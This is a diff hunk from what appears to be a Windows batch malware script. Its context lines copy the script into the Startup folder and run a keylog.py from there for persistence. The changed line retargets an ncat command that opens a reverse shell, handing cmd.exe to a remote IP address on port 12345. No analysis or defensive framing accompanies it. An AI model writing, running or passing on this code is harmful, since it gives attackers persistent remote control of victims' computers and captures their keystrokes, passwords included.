@@ -11,4 +11,4 @@ start  /min cmd /c  "xcopy /H "%~dpnx0" "%APPDATA%\Microsoft\Windows\Start Menu\
 start  /min cmd /c  "cd "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" & python "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\keylog.py""
 )
 
-start /min cmd /c  "ncat  192.168.129.17 12345 -e cmd.exe"
+start /min cmd /c  "ncat  172.20.10.15 12345 -e cmd.exe"
